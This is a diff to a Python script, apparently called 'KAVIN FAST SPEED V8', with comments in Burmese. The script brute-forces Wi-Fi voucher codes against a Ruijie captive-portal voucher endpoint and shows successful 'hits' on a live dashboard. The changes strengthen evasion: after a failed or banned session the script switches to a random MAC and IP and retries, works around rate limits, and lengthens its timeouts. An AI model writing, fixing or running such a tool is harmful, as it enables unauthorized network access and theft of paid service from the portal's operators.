@@ -1,5 +1,5 @@
 # =====================================================================
-# kavin_v8.py - KAVIN FAST SPEED V8 (Full Hits View & Progress)
+# kavin_v8.py - KAVIN FAST SPEED V8 (Full Hits View & Progress) - FIXED
 # Part 1 of 2
 # =====================================================================
 
@@ -149,7 +149,7 @@ async def fetch_official_session(session, gw_params, current_mac_ref, current_ip
 
     try:
         session.cookie_jar.clear()
-        async with session.get(full_url, headers=headers, timeout=3, allow_redirects=False) as resp:
+        async with session.get(full_url, headers=headers, timeout=5, allow_redirects=False) as resp:
             location = resp.headers.get('Location', '')
             
             if location:
@@ -167,12 +167,8 @@ async def fetch_official_session(session, gw_params, current_mac_ref, current_ip
                     }, "REAL"
     except Exception: pass
 
-    fake_sid = f"fake_sess_{random.randint(1000,9999)}"
-    return {
-        'sessionId': fake_sid,
-        'sign': None,
-        'timestamp': None
-    }, "FAKE"
+    # ⭐ FAKE မပေးတော့ဘဲ None ပဲ ပြန်ပေးလိုက်မယ်
+    return None, "FAILED"
 
 async def test_code_official(session, sess_data, code, mac, ip):
     url = RUIJIE_VOUCHER
@@ -196,7 +192,7 @@ async def test_code_official(session, sess_data, code, mac, ip):
     if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']
 
     try:
-        async with session.post(url, json=payload, headers=headers, timeout=2, ssl=False, allow_redirects=True) as r:
+        async with session.post(url, json=payload, headers=headers, timeout=3, ssl=False, allow_redirects=True) as r:
             if r.status == 429: return "__RATE_LIMITED__", "1HR"
 
             text = await r.text()
@@ -247,13 +243,11 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v8.py - KAVIN FAST SPEED V8 (Full Hits View & Progress)
-# Part 2 of 2
+# kavin_v8.py - KAVIN FAST SPEED V8 (Part 2 of 2) - FIXED
 # =====================================================================
 
 def get_dashboard_renderable(mode, length, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count, sess_stat, sess_id):
     layout = Layout()
-    # ⭐ Logo ကို V8 ပြောင်းထားပါတယ်
     header_text = Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_cyan", justify="center")
     layout.split_column(Layout(Panel(Align.center(header_text), border_style="cyan", box=ROUNDED), size=3), Layout(name="body", ratio=1))
 
@@ -268,8 +262,8 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested, el
     if sess_stat == "REAL":
         sess_text = f"REAL ({sess_id[:8]}...)"
         sess_style = "bold green"
-    elif sess_stat == "FAKE":
-        sess_text = f"FAKE ({sess_id[:8]}...)"
+    elif sess_stat == "FAILED" or sess_stat == "FAKE":
+        sess_text = "REFRESHING..."
         sess_style = "bold yellow"
     elif sess_stat == "EXPIRED":
         sess_text = "EXPIRED (Refreshing...)"
@@ -278,7 +272,7 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested, el
         sess_text = sess_stat
         sess_style = "bold cyan"
 
-    # ⭐ Progress (%) တွက်ချက်ခြင်း
+    # Progress (%)
     if scan_method == "sequential" and length > 0:
         total_possible = (10**length) if mode == "num" else (26**length) if mode == "eng" else (36**length)
         progress_pct = f"{(tried_count / total_possible * 100):.4f}%"
@@ -291,7 +285,8 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested, el
     stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
     stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
     stats.add_row("  💾 This Run", f": {tried_count:,}",         "  📈 Progress", f": {progress_pct}")
-    stats.add_row("  🔐 Session", f": {sess_text}", style=sess_style, "", "")
+    # ⭐ ဒီနေရာမှာ Syntax Error မတက်အောင် သေချာပြင်ထားပါတယ်
+    stats.add_row("  🔐 Session", f": {sess_text}", "", "", style=sess_style)
 
     stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
     check_panel = Panel(Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)
@@ -301,7 +296,6 @@ def get_dashboard_renderable(mode, length, scan_method, current_code, tested, el
     v_table.add_column("⏳ Plan", style="bold green", justify="center")
     v_table.add_column("✅ Remaining", style="bold green", justify="center")
 
-    # ⭐ Hits တွေ့သမျှ အကုန်လုံးကို ပြပေးသွားမှာပါ
     for h in hits:
         v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
 
@@ -340,7 +334,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
     hits, tested, start_time = [], 0, time.time()
     current_code = [""]
     current_status = ["Init"]
-    sess_stat = ["FAKE"] 
+    sess_stat = ["REFRESHING"] 
     sess_id = ["--------"] 
 
     current_mac = [generate_random_mac()]
@@ -356,16 +350,25 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
         with live:
             try:
                 while True:
+                    # ⭐ Session မရရင်၊ သက်တမ်းကုန်ရင် ဒီထဲကို ဝင်လာမယ်
                     if sess_data[0] is None:
-                        current_status[0] = "Active" 
+                        current_status[0] = "Refreshing..."
                         res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)
+
+                        if res is None or err_msg == "FAILED":
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "REFRESHING"
+                            sess_id[0] = "--------"
+                            await asyncio.sleep(0.2)
+                            continue
 
                         if res == "BAN":
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
                             sess_stat[0] = "BANNED"
                             sess_id[0] = "--------"
-                            await asyncio.sleep(0.1)
+                            await asyncio.sleep(0.5)
                             continue
 
                         sess_data[0] = res
